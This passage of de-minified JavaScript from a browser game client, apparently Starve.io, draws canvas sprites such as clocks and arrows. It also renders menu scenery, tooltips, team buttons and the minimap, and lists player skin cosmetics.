                        d.bezierCurveTo(210.49996948242188 * u, 104.79513549804688 * u, 210.49996948242188 * u, 104.79513549804688 * u, 194 * u, 120.29513549804688 * u),
                        d.closePath(),
                        he(d, void 0, "#c7a726", 12 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(266.9999694824219 * u, 112.29513549804688 * u),
                        d.bezierCurveTo(233.49996948242188 * u, 127.29513549804688 * u, 233.49996948242188 * u, 127.29513549804688 * u, 199 * u, 142.29513549804688 * u),
                        d.closePath(),
                        he(d, void 0, "#c7a726", 12 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(256.9999694824219 * u, 155.29513549804688 * u),
                        d.bezierCurveTo(238.49996948242188 * u, 156.29513549804688 * u, 238.49996948242188 * u, 156.29513549804688 * u, 219 * u, 157.29513549804688 * u),
                        d.closePath(),
                        he(d, void 0, "#c7a726", 12 * u),
                        d.translate(0, -8 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(66 * u, 158.29513549804688 * u),
                        d.bezierCurveTo(86 * u, 158.29513549804688 * u, 86 * u, 158.29513549804688 * u, 106 * u, 158.29513549804688 * u),
                        d.closePath(),
                        he(d, void 0, "#EDCE4F", 12 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(57.999969482421875 * u, 117.29513549804688 * u),
                        d.bezierCurveTo(85 * u, 128.29513549804688 * u, 85 * u, 128.29513549804688 * u, 113 * u, 139.29513549804688 * u),
                        d.closePath(),
                        he(d, void 0, "#EDCE4F", 12 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(95 * u, 90.29513549804688 * u),
                        d.bezierCurveTo(112 * u, 105.79513549804688 * u, 112 * u, 105.79513549804688 * u, 129 * u, 121.29513549804688 * u),
                        d.closePath(),
                        he(d, void 0, "#EDCE4F", 12 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(116 * u, 52.850677490234375 * u),
                        d.bezierCurveTo(130 * u, 83.85067749023438 * u, 130 * u, 83.85067749023438 * u, 144 * u, 114.85067749023438 * u),
                        d.closePath(),
                        he(d, void 0, "#EDCE4F", 12 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(159 * u, 61.295135498046875 * u),
                        d.bezierCurveTo(160.49996948242188 * u, 92.29513549804688 * u, 160.49996948242188 * u, 92.29513549804688 * u, 160 * u, 123.29513549804688 * u),
                        d.closePath(),
                        he(d, void 0, "#EDCE4F", 12 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(203 * u, 51.295135498046875 * u),
                        d.bezierCurveTo(190.49996948242188 * u, 83.29513549804688 * u, 190.49996948242188 * u, 83.29513549804688 * u, 176 * u, 115.29513549804688 * u),
                        d.closePath(),
                        he(d, void 0, "#EDCE4F", 12 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(225 * u, 89.29513549804688 * u),
                        d.bezierCurveTo(210.49996948242188 * u, 104.79513549804688 * u, 210.49996948242188 * u, 104.79513549804688 * u, 194 * u, 120.29513549804688 * u),
                        d.closePath(),
                        he(d, void 0, "#EDCE4F", 12 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(266.9999694824219 * u, 112.29513549804688 * u),
                        d.bezierCurveTo(233.49996948242188 * u, 127.29513549804688 * u, 233.49996948242188 * u, 127.29513549804688 * u, 199 * u, 142.29513549804688 * u),
                        d.closePath(),
                        he(d, void 0, "#EDCE4F", 12 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(256.9999694824219 * u, 155.29513549804688 * u),
                        d.bezierCurveTo(238.49996948242188 * u, 156.29513549804688 * u, 238.49996948242188 * u, 156.29513549804688 * u, 219 * u, 157.29513549804688 * u),
                        d.closePath(),
                        he(d, void 0, "#EDCE4F", 12 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(94.00003051757812 * u, 164.40341186523438 * u),
                        d.bezierCurveTo(162.50003051757812 * u, 164.40341186523438 * u, 230.00003051757812 * u, 165.40341186523438 * u, 231.00003051757812 * u, 164.40341186523438 * u),
                        d.bezierCurveTo(214.00003051757812 * u, 267.4034118652344 * u, 92.00003051757812 * u, 243.40341186523438 * u, 93.00003051757812 * u, 165.40341186523438 * u),
                        d.closePath(),
                        he(d, "#704618", "#5D3D1A", 8 * u),
                        d.beginPath(),
                        d.lineCap = "round",
                        d.lineJoin = "round",
                        d.moveTo(96 * u, 166 * u),
                        d.bezierCurveTo(88 * u, 117 * u, 129 * u, 92 * u, 161 * u, 91 * u),
                        d.bezierCurveTo(201 * u, 90 * u, 223 * u, 121 * u, 230 * u, 161 * u),
                        d.closePath(),
                        he(d, "#ECBE35", "#EDCE4F", 8 * u),
                        ke(d, 160.00003051757812 * u, 166.49432373046875 * u, 28.30194339616981 * u),
                        he(d, "#392C16", "#5E3E1A", 10 * u),
                        T))),
                    sprite[ze.CLOCK].push(c((s = .22,
                        _ = document.createElement("canvas"),
                        E = _.getContext("2d"),
                        _.width = 321 * s,
                        _.height = 345 * s,
                        E.translate(0, 5 * s),
                        E.translate(0, 20 * s),
                        ke(E, 160.5 * s, 159.5 * s, 156.39595138242822 * s),
                        he(E, "#322413", "#322413", 4 * s),
                        E.translate(0, -20 * s),
                        ke(E, 160.5 * s, 159.5 * s, 156.39595138242822 * s),
                        he(E, "#392C16", "#5E3E1A", 10 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(31.999969482421875 * s, 163.07290649414062 * s),
                        E.bezierCurveTo(22.999969482421875 * s, 67.07290649414062 * s, 106 * s, 20.072906494140625 * s, 162 * s, 23.072906494140625 * s),
                        E.bezierCurveTo(269.9999694824219 * s, 31.072906494140625 * s, 292.9999694824219 * s, 120.07290649414062 * s, 294.9999694824219 * s, 161.07290649414062 * s),
                        E.bezierCurveTo(165.49996948242188 * s, 162.07290649414062 * s, 165.49996948242188 * s, 162.07290649414062 * s, 35.999969482421875 * s, 163.07290649414062 * s),
                        E.closePath(),
                        he(E, "#3A2A0D"),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(32.999969482421875 * s, 165.07290649414062 * s),
                        E.bezierCurveTo(16.999969482421875 * s, 221.07290649414062 * s, 85 * s, 289.0729064941406 * s, 156 * s, 294.0729064941406 * s),
                        E.bezierCurveTo(263.9999694824219 * s, 293.0729064941406 * s, 295.9999694824219 * s, 199.07290649414062 * s, 294.9999694824219 * s, 159.07290649414062 * s),
                        E.closePath(),
                        he(E, "#071A1B"),
                        ke(E, 161 * s, 158.07290649414062 * s, 133.4053971921676 * s),
                        he(E, void 0, "#5E3E1A", 10 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(31.999969482421875 * s, 161.62844848632812 * s),
                        E.bezierCurveTo(162.49996948242188 * s, 161.62844848632812 * s, 162.49996948242188 * s, 161.62844848632812 * s, 292.9999694824219 * s, 161.62844848632812 * s),
                        E.closePath(),
                        he(E, void 0, "#5E3E1A", 12 * s),
                        E.translate(0, 8 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(66 * s, 158.29513549804688 * s),
                        E.bezierCurveTo(86 * s, 158.29513549804688 * s, 86 * s, 158.29513549804688 * s, 106 * s, 158.29513549804688 * s),
                        E.closePath(),
                        he(E, void 0, "#281C08", 12 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(57.999969482421875 * s, 117.29513549804688 * s),
                        E.bezierCurveTo(85 * s, 128.29513549804688 * s, 85 * s, 128.29513549804688 * s, 113 * s, 139.29513549804688 * s),
                        E.closePath(),
                        he(E, void 0, "#281C08", 12 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(95 * s, 90.29513549804688 * s),
                        E.bezierCurveTo(112 * s, 105.79513549804688 * s, 112 * s, 105.79513549804688 * s, 129 * s, 121.29513549804688 * s),
                        E.closePath(),
                        he(E, void 0, "#281C08", 12 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(116 * s, 52.850677490234375 * s),
                        E.bezierCurveTo(130 * s, 83.85067749023438 * s, 130 * s, 83.85067749023438 * s, 144 * s, 114.85067749023438 * s),
                        E.closePath(),
                        he(E, void 0, "#281C08", 12 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(159 * s, 61.295135498046875 * s),
                        E.bezierCurveTo(160.49996948242188 * s, 92.29513549804688 * s, 160.49996948242188 * s, 92.29513549804688 * s, 160 * s, 123.29513549804688 * s),
                        E.closePath(),
                        he(E, void 0, "#281C08", 12 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(203 * s, 51.295135498046875 * s),
                        E.bezierCurveTo(190.49996948242188 * s, 83.29513549804688 * s, 190.49996948242188 * s, 83.29513549804688 * s, 176 * s, 115.29513549804688 * s),
                        E.closePath(),
                        he(E, void 0, "#281C08", 12 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(225 * s, 89.29513549804688 * s),
                        E.bezierCurveTo(210.49996948242188 * s, 104.79513549804688 * s, 210.49996948242188 * s, 104.79513549804688 * s, 194 * s, 120.29513549804688 * s),
                        E.closePath(),
                        he(E, void 0, "#281C08", 12 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(266.9999694824219 * s, 112.29513549804688 * s),
                        E.bezierCurveTo(233.49996948242188 * s, 127.29513549804688 * s, 233.49996948242188 * s, 127.29513549804688 * s, 199 * s, 142.29513549804688 * s),
                        E.closePath(),
                        he(E, void 0, "#281C08", 12 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(256.9999694824219 * s, 155.29513549804688 * s),
                        E.bezierCurveTo(238.49996948242188 * s, 156.29513549804688 * s, 238.49996948242188 * s, 156.29513549804688 * s, 219 * s, 157.29513549804688 * s),
                        E.closePath(),
                        he(E, void 0, "#281C08", 12 * s),
                        E.translate(0, -8 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(66 * s, 158.29513549804688 * s),
                        E.bezierCurveTo(86 * s, 158.29513549804688 * s, 86 * s, 158.29513549804688 * s, 106 * s, 158.29513549804688 * s),
                        E.closePath(),
                        he(E, void 0, "#5E3C10", 12 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(57.999969482421875 * s, 117.29513549804688 * s),
                        E.bezierCurveTo(85 * s, 128.29513549804688 * s, 85 * s, 128.29513549804688 * s, 113 * s, 139.29513549804688 * s),
                        E.closePath(),
                        he(E, void 0, "#5E3C10", 12 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(95 * s, 90.29513549804688 * s),
                        E.bezierCurveTo(112 * s, 105.79513549804688 * s, 112 * s, 105.79513549804688 * s, 129 * s, 121.29513549804688 * s),
                        E.closePath(),
                        he(E, void 0, "#5E3C10", 12 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(116 * s, 52.850677490234375 * s),
                        E.bezierCurveTo(130 * s, 83.85067749023438 * s, 130 * s, 83.85067749023438 * s, 144 * s, 114.85067749023438 * s),
                        E.closePath(),
                        he(E, void 0, "#5E3C10", 12 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(159 * s, 61.295135498046875 * s),
                        E.bezierCurveTo(160.49996948242188 * s, 92.29513549804688 * s, 160.49996948242188 * s, 92.29513549804688 * s, 160 * s, 123.29513549804688 * s),
                        E.closePath(),
                        he(E, void 0, "#5E3C10", 12 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(203 * s, 51.295135498046875 * s),
                        E.bezierCurveTo(190.49996948242188 * s, 83.29513549804688 * s, 190.49996948242188 * s, 83.29513549804688 * s, 176 * s, 115.29513549804688 * s),
                        E.closePath(),
                        he(E, void 0, "#5E3C10", 12 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(225 * s, 89.29513549804688 * s),
                        E.bezierCurveTo(210.49996948242188 * s, 104.79513549804688 * s, 210.49996948242188 * s, 104.79513549804688 * s, 194 * s, 120.29513549804688 * s),
                        E.closePath(),
                        he(E, void 0, "#5E3C10", 12 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(266.9999694824219 * s, 112.29513549804688 * s),
                        E.bezierCurveTo(233.49996948242188 * s, 127.29513549804688 * s, 233.49996948242188 * s, 127.29513549804688 * s, 199 * s, 142.29513549804688 * s),
                        E.closePath(),
                        he(E, void 0, "#5E3C10", 12 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(256.9999694824219 * s, 155.29513549804688 * s),
                        E.bezierCurveTo(238.49996948242188 * s, 156.29513549804688 * s, 238.49996948242188 * s, 156.29513549804688 * s, 219 * s, 157.29513549804688 * s),
                        E.closePath(),
                        he(E, void 0, "#5E3C10", 12 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(96 * s, 166 * s),
                        E.bezierCurveTo(88 * s, 117 * s, 129 * s, 92 * s, 161 * s, 91 * s),
                        E.bezierCurveTo(201 * s, 90 * s, 223 * s, 121 * s, 230 * s, 161 * s),
                        E.closePath(),
                        he(E, "#704618", "#5D3D1A", 8 * s),
                        E.beginPath(),
                        E.lineCap = "round",
                        E.lineJoin = "round",
                        E.moveTo(94.00003051757812 * s, 164.40341186523438 * s),
                        E.bezierCurveTo(162.50003051757812 * s, 164.40341186523438 * s, 230.00003051757812 * s, 165.40341186523438 * s, 231.00003051757812 * s, 164.40341186523438 * s),
                        E.bezierCurveTo(214.00003051757812 * s, 267.4034118652344 * s, 92.00003051757812 * s, 243.40341186523438 * s, 93.00003051757812 * s, 165.40341186523438 * s),
                        E.closePath(),
                        he(E, "#E1DDD5", "#EAE7E4", 8 * s),
                        ke(E, 160.00003051757812 * s, 166.49432373046875 * s, 28.30194339616981 * s),
                        he(E, "#392C16", "#5E3E1A", 10 * s),
                        _))),
                    sprite[ze.ARROW_CLOCK] = c((r = .22,
                        o = document.createElement("canvas"),
                        a = o.getContext("2d"),
                        o.width = 321 * r,
                        o.height = 345 * r,
                        a.translate(0, 5 * r),
                        ke(a, 161.00003051757812 * r, 165.40341186523438 * r, 20.808652046684813 * r),
                        he(a, "#C09D6F", "#A37943", 10 * r),
                        a.beginPath(),
                        a.lineCap = "round",
                        a.lineJoin = "round",
                        a.moveTo(162.00003051757812 * r, 48.403411865234375 * r),
                        a.bezierCurveTo(172.50003051757812 * r, 67.40341186523438 * r, 172.50003051757812 * r, 67.40341186523438 * r, 183.00003051757812 * r, 86.40341186523438 * r),
                        a.bezierCurveTo(160.50003051757812 * r, 86.40341186523438 * r, 160.50003051757812 * r, 86.40341186523438 * r, 138.00003051757812 * r, 86.40341186523438 * r),
                        a.closePath(),
                        he(a, "#C09D6F", "#A37943", 10 * r),
                        a.save(),
                        a.translate(161.50003051757812 * r, 117.90341186523438 * r),
                        Ve(a, -5.5 * r, -37.5 * r, 11 * r, 75 * r, 10 * r),
                        a.restore(),
                        he(a, "#C09D6F", "#A37943", 10 * r),
                        a.save(),
                        a.translate(162.00003051757812 * r, 78.90341186523438 * r),
                        Ve(a, -10 * r, -5.5 * r, 20 * r, 11 * r, +r),
                        a.restore(),
                        he(a, "#C09D6F"),
                        ke(a, 161.00003051757812 * r, 163.6761474609375 * r, 17.08800749063506 * r),
                        he(a, "#C09D6F"),
                        o)),
                    sprite[ze.OPTION_BUTTON] = [],
                    sprite[ze.OPTION_BUTTON].push(c(c1(1.5, ["#795026", "#654320", "#eda80d"], 0))),
                    sprite[ze.OPTION_BUTTON].push(c(c1(1.5, ["#8f5e2c", "#7a5126", "#eda80d"], 1))),
                    sprite[ze.OPTION_BUTTON].push(c(c1(1.5, ["#67441f", "#573819", "#9c6e08"], 1))),
                    sprite[ze.AUTO_FEED] = IMAGES.AUTO_FEED,
                    sprite[ze.BANDAGE_ACTIVATED] = IMAGES.BANDAGE_ACTIVATED,
                    sprite[ze.STOP_REGENERATION] = IMAGES.STOP_REGENERATION,
                    sprite[ze.STOP_REGENERATION_BLIZZARD] = IMAGES.STOP_REGENERATION_BLIZZARD,
                    sprite[ze.SHOW_SPECTATORS] = Tt(1, "Show spectators", 25, "#FFF", void 0, void 0, "#000", 5, 220),
                    sprite[ze.RECONNECT] = Tt(1, "Reconnecting...", 30, "#FFF"),
                    console.log("Load canvas", Date.now() - e)
            }
            function K0() {
                var e = uo.time;
                if (sprite[ze.HERB] && (fe.drawImage(sprite[ze.HERB][e][1], ye + 480, He + 190),
                    fe.drawImage(sprite[ze.HERB][e][2], ye + 180, He - 430),
                    fe.drawImage(sprite[ze.HERB][e][1], ye - 855, He + 100),
                    fe.drawImage(sprite[ze.HERB][e][0], ye - 550, He - 300),
                    fe.drawImage(sprite[ze.HERB][e][0], ye - 1020, He - 520)),
                    sprite[ze.STONES] && (fe.drawImage(sprite[ze.STONES][e][1], ye - 80, He - 640),
                        fe.drawImage(sprite[ze.STONES][e][1], ye + 80, He + 490),
                        fe.drawImage(sprite[ze.STONES][e][2], ye - 180, He - 700),
                        fe.drawImage(sprite[ze.STONES][e][0], ye + 550, He + 100),
                        fe.drawImage(sprite[ze.STONES][e][1], ye + 450, He + 300),
                        fe.drawImage(sprite[ze.STONES][e][1], ye + 780, He + 300),
                        fe.drawImage(sprite[ze.STONES][e][2], ye + 980, He + 200),
                        fe.drawImage(sprite[ze.STONES][e][2], ye + 680, He + 600),
                        fe.drawImage(sprite[ze.STONES][e][2], ye - 380, He + 100),
                        fe.drawImage(sprite[ze.STONES][e][2], ye + 280, He + 250)),
                    sprite[ze.PLANT] && (fe.drawImage(sprite[ze.PLANT][e][0], ye - 590, He),
                        fe.drawImage(sprite[ze.PLANT][e][0], ye + 120, He - 390),
                        fe.drawImage(sprite[ze.PLANT][e][0], ye - 270, He + 340)),
                    sprite[ze.TREE] && (fe.drawImage(sprite[ze.TREE][e][4], ye - 700, He - 600),
                        fe.drawImage(sprite[ze.TREE][e][2], ye - 970, He - 250),
                        fe.drawImage(sprite[ze.TREE][e][5], ye - 720, He - 200),
                        fe.drawImage(sprite[ze.TREE][e][2], ye - 1020, He + 340),
                        fe.drawImage(sprite[ze.TREE][e][0], ye - 1120, +He),
                        fe.drawImage(sprite[ze.TREE][e][1], ye - 650, He - 330),
                        fe.drawImage(sprite[ze.TREE][e][4], ye - 495, He - 90),
                        fe.drawImage(sprite[ze.TREE][e][3], ye - 520, He + 340),
                        fe.drawImage(sprite[ze.TREE][e][2], ye + 830, He - 520)),
                    sprite[ze.FIR],
                    xe && Fe) {
                    var e = xe.cam.x
                        , t = xe.cam.y
                        , i = (xe.cam.x = ye,
                            xe.cam.y = He,
                            Fe.time);
                    Fe.time = uo.time;
                    var n, r = uo.items;
                    r[2].x = 400,
                        r[2].y = 100,
                        r[2].draw(ze.WORKBENCH),
                        (n = r[1]).x = -500,
                        n.y = 100,
                        n.fruits[0].x = n.x - 20.5,
                        n.fruits[0].y = n.y - 22.5,
                        n.fruits[1].x = n.x - 35.5,
                        n.fruits[1].y = n.y + 7.5,
                        n.fruits[2].x = n.x + 7.5,
                        n.fruits[2].y = n.y - 30,
                        n.fruits[3].x = n.x + 22.5,
                        n.fruits[3].y = n.y,
                        n.fruits[4].x = n.x - 7.5,
                        n.fruits[4].y = n.y + 14.5;
                    for (var o = 0; o < n.info; o++)
                        n.fruits[o].draw(ze.FRUIT);
                    for ((n = r[3]).x = 210,
                        n.y = -290,
                        n.fruits[0].x = n.x - 20.5,
                        n.fruits[0].y = n.y - 22.5,
                        n.fruits[1].x = n.x - 35.5,
                        n.fruits[1].y = n.y + 7.5,
                        n.fruits[2].x = n.x + 7.5,
                        n.fruits[2].y = n.y - 30,
                        n.fruits[3].x = n.x + 22.5,
                        n.fruits[3].y = n.y,
                        n.fruits[4].x = n.x - 7.5,
                        n.fruits[4].y = n.y + 14.5,
                        o = 0; o < n.info; o++)
                        n.fruits[o].draw(ze.FRUIT);
                    r[0].x = 450,
                        r[0].y = -100,
                        r[0].draw_bg(ze.WOOD_FIRE),
                        r[0].draw_fg(),
                        xe.cam.x = e,
                        xe.cam.y = t,
                        Fe.time = i
                }
            }
            function Ke(e, t, i, n, r, o, a, s, _, E) {
                void 0 !== t.tryLoad && 1 !== t.tryLoad() || (void 0 !== E ? e.drawImage(t, i, n, Math.max(1, r), Math.max(1, o), a, s, _, E) : void 0 !== o ? e.drawImage(t, i, n, r, o) : e.drawImage(t, i, n))
            }
            function U0() {
                var e = Je.info_box
                    , t = e.id;
                1 === e.activated && 1 === e.display && (void 0 === INFO_BOX[t] && (INFO_BOX[t] = function (e) {
                    var t = document.createElement("canvas")
                        , i = t.getContext("2d")
                        , n = We[e]
                        , r = (i.font = "20px Baloo Paaji",
                            0);
                    for (1 <= n.length && (r = Math.max(0, i.measureText(n[0]).width)),
                        i.font = "17px Baloo Paaji",
                        2 <= n.length && (r = Math.max(r, i.measureText(n[1]).width)),
                        i.font = "14px Baloo Paaji",
                        Ze = 2; Ze < n.length; Ze++)
                        r = Math.max(r, i.measureText(n[Ze]).width);
                    var e = r + 35
                        , o = 0
                        , o = 1 === n.length ? 55 : 2 === n.length ? 85 : 26 * (n.length - 2) + 85;
                    if (Ve(i, 0, 0, t.width = e, t.height = o, 10),
                        i.fillStyle = "#000000",
                        i.globalAlpha = .5,
                        i.fill(),
                        1 <= n.length && (i.textBaseline = "middle",
                            i.font = "20px Baloo Paaji",
                            i.globalAlpha = 1,
                            i.fillStyle = "#e2c340",
                            i.fillText(n[0], 15, 28)),
                        2 <= n.length && (i.font = "17px Baloo Paaji",
                            i.fillStyle = "#ffffff",
                            i.fillText(n[1], 15, 55),
                            o = 55),
                        3 <= n.length)
                        for (i.font = "14px Baloo Paaji",
                            i.globalAlpha = .7,
                            Ze = 2; Ze < n.length; Ze++)
                            i.fillText(n[Ze], 15, o + 28),
                                o += 26;
                    return t
                }(t)),
                    1 === e.craft ? Ke(fe, INFO_BOX[t], e.x, e.y) : e.x - 80 + INFO_BOX[t].width > Le ? Ke(fe, INFO_BOX[t], Le - INFO_BOX[t].width - 10, e.y - INFO_BOX[t].height - 10) : Ke(fe, INFO_BOX[t], e.x - 80, e.y - INFO_BOX[t].height - 10))
            }
            function Y0(e, t) {
                sprite[ze.COUNTER][e] || (sprite[ze.COUNTER][e] = Tt(Pe, "x" + e, 17, "#FFF"));
                var e = sprite[ze.COUNTER][e]
                    , i = t.info.translate.x + t.info.img[0].width - e.width - 14 * Pe
                    , n = t.info.translate.y + t.info.img[0].height - e.height - 19 * Pe;
                t.info.state == Ce && (n += 5 * Pe),
                    Ke(fe, e, i, n)
            }
            function F0() {
                if (xe.totem.id = -1,
                    xe.totem.pid = -1,
                    !(xe.spectator || xe.totem.wait || xe.zombie)) {
                    var e = Fe.fast_units[xe.uid]
                        , t = Ue.DIST_TOTEM;
                    if (e)
                        for (var i = 0; i < Fe.units[Ye.TOTEM].length; i++) {
                            var n = Fe.units[Ye.TOTEM][i]
                                , r = Utils.dist(n, e);
                            r < t && (t = r,
                                xe.totem.id = n.id,
                                xe.totem.pid = n.pid,
                                xe.totem.info = n.info,
                                xe.totem.lock = n.extra)
                        }
                    var o = Je.team_buttons_id
                        , a = ((Je.team_buttons_id = -1) == xe.totem.pid || 0 != xe.team.length && xe.id != xe.totem.pid ? 0 != xe.team.length && xe.team[0] != xe.id ? Je.team_buttons_id = i2.TEAM_LEAVE : 0 != xe.team.length && xe.team[0] == xe.id ? Je.team_buttons_id = i2.TEAM_SHOW : 0 != xe.team.length && (Je.team_buttons_id = i2.TEAM_JOIN) : 0 == xe.team.length && 8 <= xe.totem.info || 0 == xe.team.length && xe.totem.lock ? Je.team_buttons_id = i2.TEAM_FULL : 0 == xe.team.length ? Je.team_buttons_id = i2.TEAM_JOIN : Je.team_buttons_id = i2.TEAM_MANAGE,
                            -1 != Je.team_buttons_id && Je.team_buttons[Je.team_buttons_id].button.draw(fe),
                            document.getElementById("team_box").style);
                    -1 != Je.team_buttons_id && Je.team_buttons_id != o && "inline-block" == a.display && Je.team_buttons[Je.team_buttons_id].action()
                }
            }
            render_minimap = function () {
                for (var e = 0; e < 2; e++) {
                    sprite[ze.MINIMAP_CTX][e].clearRect(0, 0, 193, 193),
                        sprite[ze.MINIMAP_CTX][e].drawImage(MINIMAP_UTILS.MAP[e], 0, 0, 193, 193),
                        sprite[ze.BIGMAP_CTX][e].clearRect(0, 0, 600, 600),
                        sprite[ze.BIGMAP_CTX][e].drawImage(MINIMAP_UTILS.MAP[e], 0, 0, 600, 600);
                    for (var t = Fe.biomes.length - 1; 0 <= t; t--) {
                        var i = Fe.biomes[t]
                            , n = 193 * i.x1 / (100 * Fe.nw)
                            , r = 193 * i.y1 / (100 * Fe.nh)
                            , o = 193 * i.w / (100 * Fe.nw)
                            , a = 193 * i.h / (100 * Fe.nh)
                            , s = 600 * i.x1 / (100 * Fe.nw)
                            , _ = 600 * i.y1 / (100 * Fe.nh)
                            , E = 600 * i.w / (100 * Fe.nw)
                            , u = 600 * i.h / (100 * Fe.nh);
                        i.t === Fe.BIOME_FOREST && (sprite[ze.MINIMAP_CTX][e].drawImage(MINIMAP_UTILS.FOREST[e], n, r, o, a),
                            sprite[ze.BIGMAP_CTX][e].drawImage(MINIMAP_UTILS.FOREST[e], s, _, E, u)),
                            i.t === Fe.BIOME_WINTER && (sprite[ze.MINIMAP_CTX][e].drawImage(MINIMAP_UTILS.WINTER[e], n, r, o, a),
                                sprite[ze.BIGMAP_CTX][e].drawImage(MINIMAP_UTILS.WINTER[e], s, _, E, u)),
                            i.t === Fe.BIOME_LAVA && (sprite[ze.MINIMAP_CTX][e].drawImage(MINIMAP_UTILS.LAVA[e], n, r, o, a),
                                sprite[ze.BIGMAP_CTX][e].drawImage(MINIMAP_UTILS.LAVA[e], s, _, E, u)),
                            i.t === Fe.BIOME_DRAGON && (sprite[ze.MINIMAP_CTX][e].drawImage(MINIMAP_UTILS.CAVE[e], n, r, o, a),
                                sprite[ze.BIGMAP_CTX][e].drawImage(MINIMAP_UTILS.CAVE[e], s, _, E, u)),
                            i.t === Fe.BIOME_DESERT && (sprite[ze.MINIMAP_CTX][e].drawImage(MINIMAP_UTILS.DESERT[e], n, r, o, a),
                                sprite[ze.BIGMAP_CTX][e].drawImage(MINIMAP_UTILS.DESERT[e], s, _, E, u))
                    }
                }
            }
                ,
                render_cosmetics = function () {
                    COSMETICS = {
                        SKIN: [{
                            id: 0,
                            day: IMAGES.PLAYER0D,
                            night: IMAGES.PLAYER0N,
                            dayHand: IMAGES.HAND0D,
                            nightHand: IMAGES.HAND0N,
                            rarity: RARITY.FREE,
                            author: "Starve.io",
                            name: "Starver"
                        }, {
                            id: 3,
                            day: IMAGES.PLAYER3D,
                            night: IMAGES.PLAYER3N,
                            dayHand: IMAGES.HAND3D,
                            nightHand: IMAGES.HAND3N,
                            rarity: RARITY.FREE,
                            author: "Starve.io",
                            name: "Angry"
                        }, {
                            id: 2,
                            day: IMAGES.PLAYER2D,
                            night: IMAGES.PLAYER2N,
                            dayHand: IMAGES.HAND2D,
                            nightHand: IMAGES.HAND2N,
                            rarity: RARITY.FREE,
                            author: "Starve.io",
                            name: "Sad"
                        }, {
                            id: 9,
                            day: IMAGES.PLAYER9D,
                            night: IMAGES.PLAYER9N,
                            dayHand: IMAGES.HAND9D,
                            nightHand: IMAGES.HAND9N,
                            rarity: RARITY.FREE,
                            author: "Starve.io",
                            name: "Happy 1"
                        }, {
                            id: 1,
                            day: IMAGES.PLAYER1D,
                            night: IMAGES.PLAYER1N,
                            dayHand: IMAGES.HAND1D,
                            nightHand: IMAGES.HAND1N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "What?"
                        }, {
                            id: 4,
                            day: IMAGES.PLAYER4D,
                            night: IMAGES.PLAYER4N,
                            dayHand: IMAGES.HAND4D,
                            nightHand: IMAGES.HAND4N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Suspicious"
                        }, {
                            id: 5,
                            day: IMAGES.PLAYER5D,
                            night: IMAGES.PLAYER5N,
                            dayHand: IMAGES.HAND5D,
                            nightHand: IMAGES.HAND5N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Scar"
                        }, {
                            id: 6,
                            day: IMAGES.PLAYER6D,
                            night: IMAGES.PLAYER6N,
                            dayHand: IMAGES.HAND6D,
                            nightHand: IMAGES.HAND6N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "In Trouble"
                        }, {
                            id: 7,
                            day: IMAGES.PLAYER7D,
                            night: IMAGES.PLAYER7N,
                            dayHand: IMAGES.HAND7D,
                            nightHand: IMAGES.HAND7N,
                            rarity: RARITY.WOOD,
                            author: "Starve.io",
                            name: "Cute"
                        }, {
                            id: 8,
                            day: IMAGES.PLAYER8D,
